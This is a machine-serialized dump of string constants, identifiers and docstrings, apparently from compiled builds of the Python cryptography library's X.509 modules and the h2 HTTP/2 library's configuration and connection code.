NoneaNoneuDistributionPoint.__init__uDistributionPoint.__repr__uDistributionPoint.__eq__uDistributionPoint.__hash__uDistributionPoint.full_nameDareturnuRelativeDistinguishedName | NoneuDistributionPoint.relative_nameDareturnufrozenset[ReasonFlags] | NoneuDistributionPoint.reasonsuDistributionPoint.crl_issueraEnumakeyCompromiseakey_compromiseacACompromiseaca_compromiseaaffiliationChangedaaffiliation_changedasupersededacessationOfOperationacessation_of_operationacertificateHoldacertificate_holdaprivilegeWithdrawnaprivilege_withdrawnaaACompromiseaaa_compromisearemoveFromCRLlllllllla_REASON_BIT_MAPPINGa_CRLREASONFLAGSll
a_CRL_ENTRY_REASON_ENUM_TO_CODEaPOLICY_CONSTRAINTSDarequire_explicit_policyainhibit_policy_mappingareturnuint | Noneuint | NoneaNoneuPolicyConstraints.__init__uPolicyConstraints.__repr__uPolicyConstraints.__eq__uPolicyConstraints.__hash__uPolicyConstraints.require_explicit_policyuPolicyConstraints.inhibit_policy_mappinguPolicyConstraints.public_bytesaCERTIFICATE_POLICIESDapoliciesareturnutyping.Iterable[PolicyInformation]aNoneuCertificatePolicies.__init__Ta_policiesuCertificatePolicies.__repr__uCertificatePolicies.__eq__uCertificatePolicies.__hash__uCertificatePolicies.public_bytesDapolicy_identifierapolicy_qualifiersareturnaObjectIdentifierutyping.Iterable[str | UserNotice] | NoneaNoneuPolicyInformation.__init__uPolicyInformation.__repr__uPolicyInformation.__eq__uPolicyInformation.__hash__uPolicyInformation.policy_identifierDareturnulist[str | UserNotice] | NoneuPolicyInformation.policy_qualifiersDanotice_referenceaexplicit_textareturnuNoticeReference | Noneustr | NoneaNoneuUserNotice.__init__uUserNotice.__repr__uUserNotice.__eq__uUserNotice.__hash__DareturnuNoticeReference | NoneuUserNotice.notice_referenceDareturnustr | NoneuUserNotice.explicit_textDaorganizationanotice_numbersareturnustr | Noneutyping.Iterable[int]aNoneuNoticeReference.__init__uNoticeReference.__repr__uNoticeReference.__eq__uNoticeReference.__hash__uNoticeReference.organizationDareturnulist[int]uNoticeReference.notice_numbersaEXTENDED_KEY_USAGEDausagesareturnutyping.Iterable[ObjectIdentifier]aNoneuExtendedKeyUsage.__init__Ta_usagesuExtendedKeyUsage.__repr__uExtendedKeyUsage.__eq__uExtendedKeyUsage.__hash__uExtendedKeyUsage.public_bytesaOCSP_NO_CHECKuOCSPNoCheck.__eq__uOCSPNoCheck.__hash__u<OCSPNoCheck()>uOCSPNoCheck.__repr__uOCSPNoCheck.public_bytesaPRECERT_POISONuPrecertPoison.__eq__uPrecertPoison.__hash__u<PrecertPoison()>uPrecertPoison.__repr__uPrecertPoison.public_bytesaTLS_FEATUREDafeaturesareturnutyping.Iterable[TLSFeatureType]aNoneuTLSFeature.__init__Ta_featuresuTLSFeature.__repr__uTLSFeature.__eq__uTLSFeature.__hash__uTLSFeature.public_bytesastatus_requestlastatus_request_v2a_TLS_FEATURE_TYPE_TO_ENUMaINHIBIT_ANY_POLICYDaskip_certsareturnaintaNoneuInhibitAnyPolicy.__init__uInhibitAnyPolicy.__repr__uInhibitAnyPolicy.__eq__uInhibitAnyPolicy.__hash__uInhibitAnyPolicy.skip_certsuInhibitAnyPolicy.public_bytesaKEY_USAGED
adigital_signatureacontent_commitmentakey_enciphermentadata_enciphermentakey_agreementakey_cert_signacrl_signaencipher_onlyadecipher_onlyareturnaboolppppppppaNoneuKeyUsage.__init__uKeyUsage.digital_signatureuKeyUsage.content_commitmentuKeyUsage.key_enciphermentuKeyUsage.data_enciphermentuKeyUsage.key_agreementuKeyUsage.key_cert_signuKeyUsage.crl_signuKeyUsage.encipher_onlyuKeyUsage.decipher_onlyuKeyUsage.__repr__uKeyUsage.__eq__uKeyUsage.__hash__uKeyUsage.public_bytesaNAME_CONSTRAINTSDapermitted_subtreesaexcluded_subtreesareturnutyping.Iterable[GeneralName] | Noneutyping.Iterable[GeneralName] | NoneaNoneuNameConstraints.__init__uNameConstraints.__eq__Datreeareturnutyping.Iterable[GeneralName]aNoneuNameConstraints._validate_treeuNameConstraints._validate_ip_nameuNameConstraints._validate_dns_nameuNameConstraints.__repr__uNameConstraints.__hash__uNameConstraints.permitted_subtreesuNameConstraints.excluded_subtreesuNameConstraints.public_bytesaGenericDaoidacriticalavalueareturnaObjectIdentifieraboolaExtensionTypeVaraNoneuExtension.__init__uExtension.oiduExtension.criticalDareturnaExtensionTypeVaruExtension.valueuExtension.__repr__uExtension.__eq__uExtension.__hash__Dageneral_namesareturnutyping.Iterable[GeneralName]aNoneuGeneralNames.__init__Ta_general_namesaoverloadDatypeareturnutype[DNSName] | type[UniformResourceIdentifier] | type[RFC822Name]ulist[str]uGeneralNames.get_values_for_typeDatypeareturnutype[DirectoryName]ulist[Name]Datypeareturnutype[RegisteredID]ulist[ObjectIdentifier]Datypeareturnutype[IPAddress]ulist[_IPAddressTypes]Datypeareturnutype[OtherName]ulist[OtherName]Datypeareturnutype[DNSName] | type[DirectoryName] | type[IPAddress] | type[OtherName] | type[RFC822Name] | type[RegisteredID] | type[UniformResourceIdentifier]ulist[_IPAddressTypes] | list[str] | list[OtherName] | list[Name] | list[ObjectIdentifier]uGeneralNames.__repr__uGeneralNames.__eq__uGeneralNames.__hash__aSUBJECT_ALTERNATIVE_NAMEuSubjectAlternativeName.__init__uSubjectAlternativeName.get_values_for_typeuSubjectAlternativeName.__repr__uSubjectAlternativeName.__eq__uSubjectAlternativeName.__hash__uSubjectAlternativeName.public_bytesaISSUER_ALTERNATIVE_NAMEuIssuerAlternativeName.__init__uIssuerAlternativeName.get_values_for_typeuIssuerAlternativeName.__repr__uIssuerAlternativeName.__eq__uIssuerAlternativeName.__hash__uIssuerAlternativeName.public_bytesaCERTIFICATE_ISSUERuCertificateIssuer.__init__uCertificateIssuer.get_values_for_typeuCertificateIssuer.__repr__uCertificateIssuer.__eq__uCertificateIssuer.__hash__uCertificateIssuer.public_bytesaCRL_REASONDareasonareturnaReasonFlagsaNoneuCRLReason.__init__uCRLReason.__repr__uCRLReason.__eq__uCRLReason.__hash__DareturnaReasonFlagsuCRLReason.reasonuCRLReason.public_bytesaINVALIDITY_DATEDainvalidity_dateareturnudatetime.datetimeaNoneuInvalidityDate.__init__uInvalidityDate.__repr__uInvalidityDate.__eq__uInvalidityDate.__hash__Dareturnudatetime.datetimeuInvalidityDate.invalidity_dateainvalidity_date_utcuInvalidityDate.invalidity_date_utcuInvalidityDate.public_bytesaPRECERT_SIGNED_CERTIFICATE_TIMESTAMPSDasigned_certificate_timestampsareturnutyping.Iterable[SignedCertificateTimestamp]aNoneuPrecertificateSignedCertificateTimestamps.__init__Ta_signed_certificate_timestampsuPrecertificateSignedCertificateTimestamps.__repr__uPrecertificateSignedCertificateTimestamps.__hash__uPrecertificateSignedCertificateTimestamps.__eq__uPrecertificateSignedCertificateTimestamps.public_bytesaSIGNED_CERTIFICATE_TIMESTAMPSuSignedCertificateTimestamps.__init__uSignedCertificateTimestamps.__repr__uSignedCertificateTimestamps.__hash__uSignedCertificateTimestamps.__eq__uSignedCertificateTimestamps.public_bytesaNONCEDanonceareturnabytesaNoneuOCSPNonce.__init__uOCSPNonce.__eq__uOCSPNonce.__hash__uOCSPNonce.__repr__uOCSPNonce.nonceuOCSPNonce.public_bytesaACCEPTABLE_RESPONSESDaresponsesareturnutyping.Iterable[ObjectIdentifier]aNoneuOCSPAcceptableResponses.__init__uOCSPAcceptableResponses.__eq__uOCSPAcceptableResponses.__hash__uOCSPAcceptableResponses.__repr__Dareturnutyping.Iterator[ObjectIdentifier]uOCSPAcceptableResponses.__iter__uOCSPAcceptableResponses.public_bytesaISSUING_DISTRIBUTION_POINTDafull_namearelative_nameaonly_contains_user_certsaonly_contains_ca_certsaonly_some_reasonsaindirect_crlaonly_contains_attribute_certsareturnutyping.Iterable[GeneralName] | NoneuRelativeDistinguishedName | Noneaboolpufrozenset[ReasonFlags] | NoneaboolpaNoneuIssuingDistributionPoint.__init__uIssuingDistributionPoint.__repr__uIssuingDistributionPoint.__eq__uIssuingDistributionPoint.__hash__uIssuingDistributionPoint.full_nameuIssuingDistributionPoint.relative_nameuIssuingDistributionPoint.only_contains_user_certsuIssuingDistributionPoint.only_contains_ca_certsuIssuingDistributionPoint.only_some_reasonsuIssuingDistributionPoint.indirect_crluIssuingDistributionPoint.only_contains_attribute_certsuIssuingDistributionPoint.public_bytesaMS_CERTIFICATE_TEMPLATEDatemplate_idamajor_versionaminor_versionareturnaObjectIdentifieruint | Noneuint | NoneaNoneuMSCertificateTemplate.__init__uMSCertificateTemplate.template_iduMSCertificateTemplate.major_versionuMSCertificateTemplate.minor_versionuMSCertificateTemplate.__repr__uMSCertificateTemplate.__eq__uMSCertificateTemplate.__hash__uMSCertificateTemplate.public_bytesDaoidavalueareturnaObjectIdentifierabytesaNoneuUnrecognizedExtension.__init__uUnrecognizedExtension.oiduUnrecognizedExtension.valueuUnrecognizedExtension.__repr__uUnrecognizedExtension.__eq__uUnrecognizedExtension.__hash__uUnrecognizedExtension.public_bytesucryptography\x509\extensions.pyTa.0wxTa.0wiatypeTa.0anameTa.0wrTa.0asctu<module cryptography.x509.extensions>Ta__class__TaselfaotherTaselfTaselfaaciTaselfafnacrl_issuerTaselfapsaesTaselfapqTaselfaaccess_methodaaccess_locationTaselfadescriptionsTaselfakey_identifieraauthority_cert_issueraauthority_cert_serial_numberTaselfacaapath_lengthTaselfadistribution_pointsTaselfacrl_numberTaselfareasonTaselfageneral_namesTaselfapoliciesTaselfafull_namearelative_nameareasonsacrl_issuerTaselfamsgaoida__class__TaselfausagesTaselfaoidacriticalavalueTaselfaextensionsTaselfaskip_certsTaselfainvalidity_dateTaselfafull_namearelative_nameaonly_contains_user_certsaonly_contains_ca_certsaonly_some_reasonsaindirect_crlaonly_contains_attribute_certsacrl_constraintsT
aselfadigital_signatureacontent_commitmentakey_enciphermentadata_enciphermentakey_agreementakey_cert_signacrl_signaencipher_onlyadecipher_onlyTaselfatemplate_idamajor_versionaminor_versionTaselfapermitted_subtreesaexcluded_subtreesTaselfaorganizationanotice_numbersTaselfaresponsesTaselfanonceTaselfarequire_explicit_policyainhibit_policy_mappingTaselfapolicy_identifierapolicy_qualifiersTaselfasigned_certificate_timestampsTaselfadigestTaselfafeaturesTaselfaoidavalueTaselfanotice_referenceaexplicit_textTaselfaencipher_onlyadecipher_onlyTapublic_keyadataaserializedTafield_namealen_methodaiter_methodagetitem_methodTaselfatreeTaclsapublic_keyadigestTaclsaskiTaclsapublic_keyTaselfaextclassaextTaselfaoidaextTaselfatypeTaselfatypeaobjsTaselfaidxafield_nameTafield_nameTaselfafield_name.cryptography.x509.general_name
aencodeTaasciiuRFC822Name values should be passed as an A-label string. This means unicode characters should be encoded via a library like idna.uvalue must be stringaparseaddrutoo many values to unpack (expected 2)uInvalid rfc822name valuea_valuea__new__u<RFC822Name(value=avalueuu)>aRFC822NameuDNSName values should be passed as an A-label string. This means unicode characters should be encoded via a library like idna.u<DNSName(value=aDNSNameuURI values should be passed as an A-label string. This means unicode characters should be encoded via a library like idna.u<UniformResourceIdentifier(value=aUniformResourceIdentifieraNameuvalue must be a Nameu<DirectoryName(value=aDirectoryNameaObjectIdentifieruvalue must be an ObjectIdentifieru<RegisteredID(value=aRegisteredIDaipaddressaIPv4AddressaIPv6AddressaIPv4NetworkaIPv6Networkuvalue must be an instance of ipaddress.IPv4Address, ipaddress.IPv6Address, ipaddress.IPv4Network, or ipaddress.IPv6Networkapackedanetwork_addressanetmasku<IPAddress(value=aIPAddressutype_id must be an ObjectIdentifieruvalue must be a binary stringa_type_idu<OtherName(type_id=atype_idu, value=aOtherNamea__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaabclatypinguemail.utilsTaparseaddrucryptography.x509.nameTaNameucryptography.x509.oidTaObjectIdentifieraUniona_IPAddressTypesTEExceptiona__prepare__aUnsupportedGeneralNameTypea__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.x509.general_namea__module__a__qualname__a__orig_bases__ametaclassaABCMetaTaGeneralNameTaGeneralNameapropertyaabstractmethodDareturnutyping.Anyu
        Return the value of the object
        uGeneralName.valueDavalueareturnastraNonea__init__uRFC822Name.__init__DareturnastruRFC822Name.valueaclassmethodDavalueareturnastraRFC822Namea_init_without_validationuRFC822Name._init_without_validationa__repr__uRFC822Name.__repr__Daotherareturnaobjectaboola__eq__uRFC822Name.__eq__Dareturnainta__hash__uRFC822Name.__hash__uDNSName.__init__uDNSName.valueDavalueareturnastraDNSNameuDNSName._init_without_validationuDNSName.__repr__uDNSName.__eq__uDNSName.__hash__uUniformResourceIdentifier.__init__uUniformResourceIdentifier.valueDavalueareturnastraUniformResourceIdentifieruUniformResourceIdentifier._init_without_validationuUniformResourceIdentifier.__repr__uUniformResourceIdentifier.__eq__uUniformResourceIdentifier.__hash__DavalueareturnaNameaNoneuDirectoryName.__init__DareturnaNameuDirectoryName.valueuDirectoryName.__repr__uDirectoryName.__eq__uDirectoryName.__hash__DavalueareturnaObjectIdentifieraNoneuRegisteredID.__init__DareturnaObjectIdentifieruRegisteredID.valueuRegisteredID.__repr__uRegisteredID.__eq__uRegisteredID.__hash__Davalueareturna_IPAddressTypesaNoneuIPAddress.__init__Dareturna_IPAddressTypesuIPAddress.valueDareturnabytesa_packeduIPAddress._packeduIPAddress.__repr__uIPAddress.__eq__uIPAddress.__hash__Datype_idavalueareturnaObjectIdentifierabytesaNoneuOtherName.__init__uOtherName.type_iduOtherName.valueuOtherName.__repr__uOtherName.__eq__uOtherName.__hash__ucryptography\x509\general_name.pyu<module cryptography.x509.general_name>Ta__class__TaselfaotherTaselfTaselfavalueTaselfatype_idavalueTaselfavalueanameaaddressTaclsavalueainstance.cryptography.x509.namebHuw#abinasciiahexlifyadecodeTautf8areplaceTw\u\\Tw"u\"Tw+u\+Tw,u\,Tw;u\;Tw<u\<Tw>u\>Twu\00lTw#w w\qw :nqnu\ uEscape special characters in RFC4514 Distinguished Name value.asubu_unescape_dn_value.<locals>.suba_RFC4514NameParsera_PAIR_REagroupTllaObjectIdentifieruoid argument must be an ObjectIdentifier instance.a_ASN1TypeaBitStringaNameOIDaX500_UNIQUE_IDENTIFIERuoid must be X500_UNIQUE_IDENTIFIER for BitString type.uvalue must be bytes for BitStringuvalue argument must be a stra_NAMEOID_LENGTH_LIMITagetutoo many values to unpack (expected 2)aencodeuAttribute's length must be >= u and <= u, but it was awarningsawarnDastacklevella_NAMEOID_DEFAULT_TYPEaUTF8Stringu_type must be from the _ASN1Type enuma_oida_valuea_typea_NAMEOID_TO_NAMEaoidadotted_stringu
        The short attribute name (for example "CN") if available,
        otherwise the OID dotted string.
        arfc4514_attribute_namew=a_escape_dn_valueavalueu
        Format as RFC4514 Distinguished Name string.

        Use short attribute name if available, otherwise fall back to OID
        dotted string.
        aNameAttributeu<NameAttribute(oid=u, value=u)>ua relative distinguished name cannot be emptyuattributes must be an iterable of NameAttributea_attributesa_attribute_setuduplicate attributes are not allowedu<genexpr>uRelativeDistinguishedName.__init__.<locals>.<genexpr>w+u
        Format as RFC4514 Distinguished Name string.

        Within each RDN, attributes are joined by '+', although that is rarely
        used in certificates.
        arfc4514_stringaattr_name_overridesuRelativeDistinguishedName.rfc4514_string.<locals>.<genexpr>aRelativeDistinguishedNameu<RelativeDistinguishedName(acastaListuattributes must be a list of NameAttribute or a list RelativeDistinguishedNameuName.__init__.<locals>.<genexpr>aparsew,u
        Format as RFC4514 Distinguished Name string.
        For example 'CN=foobar.com,O=Foo Corp,C=US'

        An X.509 name is a two-level structure: a list of sets of attributes.
        Each list element is separated by ',' and within each list element, set
        elements are separated by '+'. The latter is almost never used in
        real world certificates. According to RFC4514 section 2.1 the
        RDNSequence must be reversed when converting to string representation.
        uName.rfc4514_string.<locals>.<genexpr>arust_x509aencode_name_bytesaNameaselfa__iter__uName.__iter__uName.__len__.<locals>.<genexpr>u<Name(uName.__repr__.<locals>.<genexpr>a_dataa_idxa_attr_name_overridesa_has_dataa_peeklamatchTaposa_parse_rdna_read_charTw,ardnsu
        Parses the `data` string and converts it to a Name.

        According to RFC4514 section 2.1 the RDNSequence must be
        reversed when converting to string representation. So, when
        we parse it, we need to reverse again to get the RDNs on the
        correct order.
        a_parse_naTw+anasa_read_rea_OID_REa_DESCR_REa_NAME_TO_NAMEOIDaoid_valueTw=a_HEXSTRING_REaunhexlify:lnna_STRING_REa_unescape_dn_valuea__doc__a__file__a__spec__aoriginahas_locationa__cached__a__annotations__aannotationsareasysatypingacryptographyTautilsautilsucryptography.hazmat.bindings._rustTax509ax509ucryptography.x509.oidTaNameOIDaObjectIdentifieraEnuma__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.x509.namea__module__a__qualname__llaOctetStringllaNumericStringlaPrintableStringlaT61StringlaIA5StringlaUTCTimelaGeneralizedTimelaVisibleStringlaUniversalStringlaBMPStringa__orig_bases__a_ASN1_TYPE_TO_ENUMaCOUNTRY_NAMEaJURISDICTION_COUNTRY_NAMEaSERIAL_NUMBERaDN_QUALIFIERaEMAIL_ADDRESSaDOMAIN_COMPONENTudict[ObjectIdentifier, _ASN1Type]aMappinga_OidNameMapa_NameOidMapaCOMMON_NAMEaCNaLOCALITY_NAMEwLaSTATE_OR_PROVINCE_NAMEaSTaORGANIZATION_NAMEwOaORGANIZATIONAL_UNIT_NAMEaOUwCaSTREET_ADDRESSaSTREETaDCaUSER_IDaUIDaitemsTlpTll@Davalareturnustr | bytesastrDavalareturnastrpTnDa_validatetDaoidavaluea_typea_validateareturnaObjectIdentifierustr | bytesu_ASN1Type | NoneaboolaNonea__init__uNameAttribute.__init__DareturnaObjectIdentifieruNameAttribute.oidDareturnustr | bytesuNameAttribute.valueDareturnastruNameAttribute.rfc4514_attribute_nameDaattr_name_overridesareturnu_OidNameMap | NoneastruNameAttribute.rfc4514_stringDaotherareturnaobjectaboola__eq__uNameAttribute.__eq__Dareturnainta__hash__uNameAttribute.__hash__a__repr__uNameAttribute.__repr__Daattributesutyping.Iterable[NameAttribute]uRelativeDistinguishedName.__init__DaoidareturnaObjectIdentifierulist[NameAttribute]aget_attributes_for_oiduRelativeDistinguishedName.get_attributes_for_oiduRelativeDistinguishedName.rfc4514_stringuRelativeDistinguishedName.__eq__uRelativeDistinguishedName.__hash__Dareturnutyping.Iterator[NameAttribute]uRelativeDistinguishedName.__iter__a__len__uRelativeDistinguishedName.__len__uRelativeDistinguishedName.__repr__aoverloadDaattributesareturnutyping.Iterable[NameAttribute]aNoneuName.__init__Daattributesareturnutyping.Iterable[RelativeDistinguishedName]aNoneDaattributesareturnutyping.Iterable[NameAttribute | RelativeDistinguishedName]aNoneDadataaattr_name_overridesareturnastru_NameOidMap | NoneaNameafrom_rfc4514_stringuName.from_rfc4514_stringuName.rfc4514_stringuName.get_attributes_for_oidDareturnulist[RelativeDistinguishedName]uName.rdnsDabackendareturnutyping.Anyabytesapublic_bytesuName.public_bytesuName.__eq__uName.__hash__uName.__len__uName.__repr__acompileTu(0|([1-9]\d*))(\.(0|([1-9]\d*)))+Tu[a-zA-Z][a-zA-Z\d-]*u\\([\\ #=\"\+,;<>]|[\da-zA-Z]{2})a_PAIRu[\x01-\x1f\x21\x24-\x2A\x2D-\x3A\x3D\x3F-\x5B\x5D-\x7F]a_LUTF1u[\x01-\x21\x23-\x2A\x2D-\x3A\x3D\x3F-\x5B\x5D-\x7F]a_SUTF1u[\x01-\x1F\x21\x23-\x2A\x2D-\x3A\x3D\x3F-\x5B\x5D-\x7F]a_TUTF1u[\x80-amaxunicodew]a_UTFMBw|a_LEADCHARa_STRINGCHARa_TRAILCHARu
        (
            (u)
            (
                (u)*
                (u)
            )?
        )?
        aVERBOSETu#([\da-zA-Z]{2})+Dadataaattr_name_overridesareturnastra_NameOidMapaNoneu_RFC4514NameParser.__init__Dareturnaboolu_RFC4514NameParser._has_dataDareturnustr | Noneu_RFC4514NameParser._peekDachareturnastraNoneu_RFC4514NameParser._read_charu_RFC4514NameParser._read_reDareturnaNameu_RFC4514NameParser.parseDareturnaRelativeDistinguishedNameu_RFC4514NameParser._parse_rdnDareturnaNameAttributeu_RFC4514NameParser._parse_naucryptography\x509\name.pyTa.0wxTa.0ardnTa.0aattrTa.0aattraattr_name_overridesu<module cryptography.x509.name>Ta__class__TaselfaotherTaselfTaselfaattributesT
aselfaoidavaluea_typea_validatealength_limitsamin_lengthamax_lengthac_lenamsgTaselfadataaattr_name_overridesTaselfardnTaselfardnsTavalTaselfaoid_valueanameaoidavaluearaw_valueTaselfanasTaselfachTaselfapatamatchavalTavalasubTaclsadataaattr_name_overridesTaselfaoidTaselfabackendTaselfaattr_name_overridesTaselfaattr_name_overridesaattr_nameTwmaval.cryptography.x509.oida__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsucryptography.hazmat._oidTaAttributeOIDaAuthorityInformationAccessOIDaCertificatePoliciesOIDaCRLEntryExtensionOIDaExtendedKeyUsageOIDaExtensionOIDaNameOIDaObjectIdentifieraOCSPExtensionOIDaPublicKeyAlgorithmOIDaSignatureAlgorithmOIDaSubjectInformationAccessOIDlaAttributeOIDaAuthorityInformationAccessOIDaCertificatePoliciesOIDaCRLEntryExtensionOIDaExtendedKeyUsageOIDaExtensionOIDaNameOIDaObjectIdentifieraOCSPExtensionOIDaPublicKeyAlgorithmOIDaSignatureAlgorithmOIDaSubjectInformationAccessOIDLaAttributeOIDaAuthorityInformationAccessOIDaCRLEntryExtensionOIDaCertificatePoliciesOIDaExtendedKeyUsageOIDaExtensionOIDaNameOIDaOCSPExtensionOIDaObjectIdentifieraPublicKeyAlgorithmOIDaSignatureAlgorithmOIDaSubjectInformationAccessOIDa__all__ucryptography\x509\oid.pyu<module cryptography.x509.oid>u.cryptography.x509.verificationa__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsatypingucryptography.hazmat.bindings._rustTax509lax509arust_x509ucryptography.x509.general_nameTaDNSNameaIPAddressaDNSNameaIPAddressLaClientVerifieraPolicyBuilderaServerVerifieraStoreaSubjectaVerificationErroraVerifiedClienta__all__aStoreaUnionaSubjectaVerifiedClientaClientVerifieraServerVerifieraPolicyBuilderaVerificationErrorucryptography\x509\verification.pyu<module cryptography.x509.verification>u.h2.configXTanameu_%saattr_nameu%s must be a boola__class__a__init__astderrafileatrace_levelaprintuh2 (debug): uTafileuh2 (trace): aclient_sideaheader_encodingavalidate_outbound_headersanormalize_outbound_headersavalidate_inbound_headersanormalize_inbound_headersaDummyLoggerTuh2.configaloggera_header_encodingu
        Controls whether the headers emitted by this object in events are
        transparently decoded to ``unicode`` strings, and what encoding is used
        to do that decoding. This defaults to ``None``, meaning that headers
        will be returned as bytes. To automatically decode headers (that is, to
        return them as unicode strings), this can be set to the string name of
        any encoding, e.g. ``'utf-8'``.
        TOboolOstrMuheader_encoding must be bool, string, or Noneuheader_encoding cannot be Trueu
        Enforces constraints on the value of header encoding.
        u
h2/config
~~~~~~~~~

Objects for controlling the configuration of the HTTP/2 stack.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__asysuh2.configa__module__u
    Descriptor for handling a boolean config option.  This will block
    attempts to set boolean config options to non-bools.
    a_BooleanConfigOptiona__qualname__u_BooleanConfigOption.__init__a__get__u_BooleanConfigOption.__get__a__set__u_BooleanConfigOption.__set__u
    A Logger object that does not actual logging, hence a DummyLogger.

    For the class the log operation is merely a no-op. The intent is to avoid
    conditionals being sprinkled throughout the h2 code for calls to
    logging functions when no logger is passed into the corresponding object.
    uDummyLogger.__init__u
        No-op logging. Only level needed for now.
        adebuguDummyLogger.debugatraceuDummyLogger.traceu
    A Logger object that prints to stderr or any other file-like object.

    This class is provided for convenience and not part of the stable API.

    :param file: A file-like object passed to the print function.
        Defaults to ``sys.stderr``.
    :param trace: Enables trace-level output. Defaults to ``False``.
    aOutputLoggerTnFuOutputLogger.__init__uOutputLogger.debuguOutputLogger.traceu
    An object that controls the way a single HTTP/2 connection behaves.

    This object allows the users to customize behaviour. In particular, it
    allows users to enable or disable optional features, or to otherwise handle
    various unusual behaviours.

    This object has very little behaviour of its own: it mostly just ensures
    that configuration is self-consistent.

    :param client_side: Whether this object is to be used on the client side of
        a connection, or on the server side. Affects the logic used by the
        state machine, the default settings values, the allowable stream IDs,
        and several other properties. Defaults to ``True``.
    :type client_side: ``bool``

    :param header_encoding: Controls whether the headers emitted by this object
        in events are transparently decoded to ``unicode`` strings, and what
        encoding is used to do that decoding. This defaults to ``None``,
        meaning that headers will be returned as bytes. To automatically
        decode headers (that is, to return them as unicode strings), this can
        be set to the string name of any encoding, e.g. ``'utf-8'``.

        .. versionchanged:: 3.0.0
           Changed default value from ``'utf-8'`` to ``None``

    :type header_encoding: ``str``, ``False``, or ``None``

    :param validate_outbound_headers: Controls whether the headers emitted
        by this object are validated against the rules in RFC 7540.
        Disabling this setting will cause outbound header validation to
        be skipped, and allow the object to emit headers that may be illegal
        according to RFC 7540. Defaults to ``True``.
    :type validate_outbound_headers: ``bool``

    :param normalize_outbound_headers: Controls whether the headers emitted
        by this object are normalized before sending.  Disabling this setting
        will cause outbound header normalization to be skipped, and allow
        the object to emit headers that may be illegal according to
        RFC 7540. Defaults to ``True``.
    :type normalize_outbound_headers: ``bool``

    :param validate_inbound_headers: Controls whether the headers received
        by this object are validated against the rules in RFC 7540.
        Disabling this setting will cause inbound header validation to
        be skipped, and allow the object to receive headers that may be illegal
        according to RFC 7540. Defaults to ``True``.
    :type validate_inbound_headers: ``bool``

    :param normalize_inbound_headers: Controls whether the headers received by
        this object are normalized according to the rules of RFC 7540.
        Disabling this setting may lead to h2 emitting header blocks that
        some RFCs forbid, e.g. with multiple cookie fields.

        .. versionadded:: 3.0.0

    :type normalize_inbound_headers: ``bool``

    :param logger: A logger that conforms to the requirements for this module,
        those being no I/O and no context switches, which is needed in order
        to run in asynchronous operation.

        .. versionadded:: 2.6.0

    :type logger: ``logging.Logger``
    aH2ConfigurationTaclient_sideTavalidate_outbound_headersTanormalize_outbound_headersTavalidate_inbound_headersTanormalize_inbound_headersTtntpppnuH2Configuration.__init__uH2Configuration.header_encodingasetteruh2\config.pyu<module h2.config>Ta__class__TaselfainstanceaownerTaselfavargsTaselfaclient_sideaheader_encodingavalidate_outbound_headersanormalize_outbound_headersavalidate_inbound_headersanormalize_inbound_headersaloggerTaselfafileatrace_levela__class__TaselfanameTaselfainstanceavalueTaselfavargsakwargsTaselfafmtstraargsTaselfTaselfavalue.h2.connection:aConnectionStateaIDLEastateaConnectionInputsuInput must be an instance of ConnectionInputsa_transitionsutoo many values to unpack (expected 2)aCLOSEDaProtocolErroruInvalid input %s in state %su
        Process a specific input in the state machine.
        aH2ConnectionStateMachineastate_machineastreamslahighest_inbound_stream_idahighest_outbound_stream_idaEncoderaencoderaDecoderadecoderaDEFAULT_MAX_HEADER_LIST_SIZEamax_header_list_sizeaconfigaH2ConfigurationTtTaclient_sideaSettingsaclient_sideaSettingCodesaMAX_CONCURRENT_STREAMSldaMAX_HEADER_LIST_SIZETaclientainitial_valuesalocal_settingsTaclientaremote_settingsainitial_window_sizeaoutbound_flow_control_windowamax_frame_sizeamax_outbound_frame_sizeamax_inbound_frame_sizeaFrameBufferTaserveraincoming_buffera_header_framesBa_data_to_sendaSizeLimitDictaMAX_CLOSED_STREAMSTasize_limita_closed_streamsaWindowManagerTamax_window_sizea_inbound_flow_control_window_manageraHeadersFramea_receive_headers_frameaPushPromiseFramea_receive_push_promise_frameaSettingsFramea_receive_settings_frameaDataFramea_receive_data_frameaWindowUpdateFramea_receive_window_update_frameaPingFramea_receive_ping_frameaRstStreamFramea_receive_rst_stream_frameaPriorityFramea_receive_priority_frameaGoAwayFramea_receive_goaway_frameaContinuationFramea_receive_naked_continuationaAltSvcFramea_receive_alt_svc_frameaExtensionFramea_receive_unknown_framea_frame_dispatch_tablecaserializeu<genexpr>uH2Connection._prepare_for_sending.<locals>.<genexpr>abody_lenaselfaitemsaopenlacountlaclosedato_deleteapopaclosed_byu
        A common method of counting number of open streams. Returns the number
        of streams that are open *and* that have (stream ID % 2) == remainder.
        While it iterates, also deletes any closed streams.
        a_open_streamsu
        The current number of open outbound streams.
        u
        The current number of open inbound streams.
        acurrent_window_sizeu
        The size of the inbound flow control window for the connection. This is
        rarely publicly useful: instead, use :meth:`remote_flow_control_window
        <h2.connection.H2Connection.remote_flow_control_window>`. This
        shortcut is largely present to provide a shortcut to this data.
        aloggeradebuguAttempting to initiate stream ID %da_stream_id_is_outboundaStreamIDTooLowErrorTuInvalid stream ID for peer.aH2StreamTaconfigainbound_window_sizeaoutbound_window_sizeuStream ID %d createduCurrent streams: %sakeysu
        Initiate a new stream.

        .. versionchanged:: 2.0.0
           Removed this function from the public API.

        :param stream_id: The ID of the stream to open.
        :param allowed_ids: What kind of stream ID is allowed.
        TuInitializing connectionaprocess_inputaSEND_SETTINGScPRI * HTTP/2.0

SM

TlwfasettingsuSend Settings frame: %su
        Provides any data that needs to be sent at the start of the connection.
        Must be called for both clients and servers.
        uUpgrade connection. Current settings: %sainitiate_connectionaserialize_bodyabase64aurlsafe_b64encodeaurlsafe_b64decodeaparse_bodyaSEND_HEADERSaRECV_HEADERSuProcess input %sa_begin_new_streamaAllowedStreamIDsaODDTastream_idaallowed_idsaupgradeu
        Call to initialise the connection object for use with an upgraded
        HTTP/2 connection (i.e. a connection negotiated using the
        ``Upgrade: h2c`` HTTP header).

        This method differs from :meth:`initiate_connection
        <h2.connection.H2Connection.initiate_connection>` in several ways.
        Firstly, it handles the additional SETTINGS frame that is sent in the
        ``HTTP2-Settings`` header field. When called on a client connection,
        this method will return a bytestring that the caller can put in the
        ``HTTP2-Settings`` field they send on their initial request. When
